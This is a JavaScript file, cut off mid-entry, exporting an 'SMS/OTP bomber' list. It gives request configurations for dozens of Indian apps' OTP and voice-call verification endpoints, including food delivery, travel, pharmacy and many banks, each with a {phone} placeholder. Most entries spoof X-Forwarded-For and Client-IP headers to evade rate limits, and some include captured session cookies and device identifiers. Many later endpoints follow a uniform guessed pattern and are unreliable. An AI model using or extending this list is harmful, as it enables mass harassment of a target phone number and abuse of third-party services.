export const BOMBER_APIS = [
  {
      "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
      "method": "POST",
      "payload": {
          "mobileNo": "{phone}",
          "countryCode": "+91",
          "appCode": "un",
          "messageId": "1",
          "emailId": "",
          "subject": "Register",
          "priority": "1",
          "device": "web",
          "variant": "v1",
          "templateCode": 1
      },
      "headers": {
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
          "Accept": "application/json, text/plain, */*",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Content-Type": "application/json",
          "identifier": "home",
          "mlang": "en",
          "sec-ch-ua-platform": "\"Android\"",
          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
          "sec-ch-ua-mobile": "?1",
          "alang": "en",
          "country_code": "IN",
          "vlang": "en",
          "origin": "https://www.hungama.com",
          "sec-fetch-site": "same-site",
          "sec-fetch-mode": "cors",
          "sec-fetch-dest": "empty",
          "referer": "https://www.hungama.com/",
          "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
          "priority": "u=1, i",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://merucabapp.com/api/otp/generate",
      "method": "POST",
      "payload": {"mobile_number": "{phone}"},
      "headers": {
          "Mobilenumber": "{phone}",
          "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
          "Oauthtoken": "",
          "AppVersion": "245",
          "ApiVersion": "6.2.55",
          "DeviceType": "Android",
          "DeviceId": "44098bdebb2dc047",
          "Content-Type": "application/x-www-form-urlencoded",
          "Host": "merucabapp.com",
          "Connection": "Keep-Alive",
          "Accept-Encoding": "gzip",
          "User-Agent": "okhttp/4.9.0",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
      "method": "POST",
      "payload": {"api": "send_otp", "brand": "dayco", "mob": "{phone}", "resend_otp": "resend_otp"},
      "headers": {
          "Host": "ekyc.daycoindia.com",
          "sec-ch-ua-platform": "\"Android\"",
          "X-Requested-With": "XMLHttpRequest",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
          "Accept": "application/json, text/javascript, */*; q=0.01",
          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "sec-ch-ua-mobile": "?1",
          "Origin": "https://ekyc.daycoindia.com",
          "Sec-Fetch-Site": "same-origin",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Dest": "empty",
          "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
          "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
          "Priority": "u=1, i",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://api.doubtnut.com/v4/student/login",
      "method": "POST",
      "payload": {
          "app_version": "7.10.51",
          "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
          "course": "",
          "phone_number": "{phone}",
          "language": "en",
          "udid": "b751fb63c0ae17ba",
          "class": "",
          "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
      },
      "headers": {
          "version_code": "1160",
          "has_upi": "false",
          "device_model": "ASUS_I005DA",
          "android_sdk_version": "28",
          "content-type": "application/json; charset=utf-8",
          "accept-encoding": "gzip",
          "user-agent": "okhttp/5.0.0-alpha.2",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
      "method": "POST",
      "payload": {"phone": "{phone}", "countryCode": "IN"},
      "headers": {
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Content-Type": "application/x-www-form-urlencoded",
          "sec-ch-ua-platform": "Android",
          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
          "sec-ch-ua-mobile": "?1",
          "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
          "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
          "origin": "https://www.nobroker.in",
          "sec-fetch-site": "same-origin",
          "sec-fetch-mode": "cors",
          "sec-fetch-dest": "empty",
          "referer": "https://www.nobroker.in/",
          "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
          "priority": "u=1, i",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}",
          "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaFp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
      }
  },
  {
      "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
      "method": "POST",
      "payload": {"mobileNumber": "{phone}"},
      "headers": {
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
          "Accept": "application/json",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Content-Type": "application/json",
          "sec-ch-ua-platform": "Android",
          "authorization": "Bearer null",
          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
          "sec-ch-ua-mobile": "?1",
          "origin": "https://app.shiprocket.in",
          "sec-fetch-site": "same-site",
          "sec-fetch-mode": "cors",
          "sec-fetch-dest": "empty",
          "referer": "https://app.shiprocket.in/",
          "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
          "priority": "u=1, i",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
      "method": "POST",
      "payload": {"phone": "{phone}", "applSource": "", "isOtpViaCallAtLogin": "true"},
      "headers": {
          "Content-Type": "application/json",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
      "method": "POST",
      "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"},
      "headers": {
          "Host": "api.penpencil.co",
          "content-type": "application/json; charset=utf-8",
          "accept-encoding": "gzip",
          "user-agent": "okhttp/3.9.1",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
      "method": "POST",
      "payload": {"number": "{phone}", "is_corporate_user": false, "otp_on_call": true},
      "headers": {
          "Host": "www.1mg.com",
          "content-type": "application/json; charset=utf-8",
          "accept-encoding": "gzip",
          "user-agent": "okhttp/3.9.1",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {
          "Host": "profile.swiggy.com",
          "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
          "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
          "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
          "pl-version": "55",
          "user-agent": "Swiggy-Android",
          "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
          "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
          "version-code": "1161",
          "app-version": "4.38.1",
          "latitude": "0.0",
          "longitude": "0.0",
          "os-version": "13",
          "accessibility_enabled": "false",
          "swuid": "4c27ae3a76b146f3",
          "deviceid": "4c27ae3a76b146f3",
          "x-network-quality": "GOOD",
          "accept-encoding": "gzip",
          "accept": "application/json; charset=utf-8",
          "content-type": "application/json; charset=utf-8",
          "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
      "method": "POST",
      "payload": {"phone_number": {"number": "{phone}", "country_code": "+91"}},
      "headers": {
          "Host": "api.kpnfresh.com",
          "sec-ch-ua-platform": "\"Android\"",
          "cache": "no-store",
          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
          "x-channel-id": "WEB",
          "sec-ch-ua-mobile": "?1",
          "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
          "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
          "content-type": "application/json",
          "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
          "accept": "*/*",
          "origin": "https://www.kpnfresh.com",
          "sec-fetch-site": "same-site",
          "sec-fetch-mode": "cors",
          "sec-fetch-dest": "empty",
          "referer": "https://www.kpnfresh.com/",
          "accept-encoding": "gzip, deflate, br, zstd",
          "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
          "priority": "u=1, i",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://api.servetel.in/v1/auth/otp",
      "method": "POST",
      "payload": {"mobile_number": "{phone}"},
      "headers": {
          "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
          "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
          "Host": "api.servetel.in",
          "Connection": "Keep-Alive",
          "Accept-Encoding": "gzip",
          "X-Forwarded-For": "{ip}",
          "Client-IP": "{ip}"
      }
  },
  {
      "endpoint": "https://api.flipkart.com/2/user/otp/generate",
      "method": "POST",
      "payload": {"loginId": "+91{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.amazon.in/ap/signin/otp",
      "method": "POST",
      "payload": {"mobileNumber": "{phone}", "countryCode": "IN"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.zomato.com/webroutes/auth/init",
      "method": "POST",
      "payload": {"phone": "{phone}", "type": "otp"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://api.swiggy.com/api/v1/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://api.zeptonow.com/api/v1/user/auth/otp",
      "method": "POST",
      "payload": {"mobileNumber": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://blinkit.com/v1/auth/login",
      "method": "POST",
      "payload": {"phone": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.apollopharmacy.in/api/v1/auth/sendOtp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://pharmeasy.in/api/auth/requestOtp",
      "method": "POST",
      "payload": {"contactNumber": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://api.lenskart.com/v1/customers/send-otp",
      "method": "POST",
      "payload": {"phone": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.myntra.com/gateway/v2/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.ajio.com/api/auth/sendOtp",
      "method": "POST",
      "payload": {"mobileNumber": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.tatacliq.com/api/v1/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.jiomart.com/api/v1/customer/send-otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.makemytrip.com/api/auth/v1/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.goibibo.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.cleartrip.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.yatra.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.redbus.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.abhibus.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.ixigo.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.bookmyshow.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.paytm.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.phonepe.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.freecharge.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.mobikwik.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.olacabs.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.uber.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.rapido.bike/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.dunzo.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.bigbasket.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.grofers.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.practo.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.netmeds.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.medlife.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.nykaa.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.purplle.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.bewakoof.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.koovs.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.limeroad.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.snapdeal.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.shopclues.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.firstcry.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.hopscotch.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.croma.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.reliancedigital.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.vijaysales.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.sangeethamobiles.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.poorvikamobiles.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.bajajfinserv.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.muthootfinance.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.manappuram.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.icicibank.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.hdfcbank.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.onlinesbi.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.axisbank.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.kotak.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.yesbank.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.indusind.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.pnbindia.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.bankofbaroda.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.canarabank.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.unionbankofindia.co.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.bankofindia.co.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.indianbank.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.centralbankofindia.co.in/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://www.somarutv.com/api/auth/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "X-Forwarded-For": "{ip}"}
  },
  {
      "endpoint": "https://api.unacademy.com/api/v3/user/user_login/",
      "method": "POST",
      "payload": {"phone": "{phone}", "country_code": "IN"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.zee5.com/v1/user/loginotp",
      "method": "POST",
      "payload": {"mobile_number": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.lenskart.com/v2/customers/send-otp",
      "method": "POST",
      "payload": {"telephone": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.cure.fit/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"phone": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
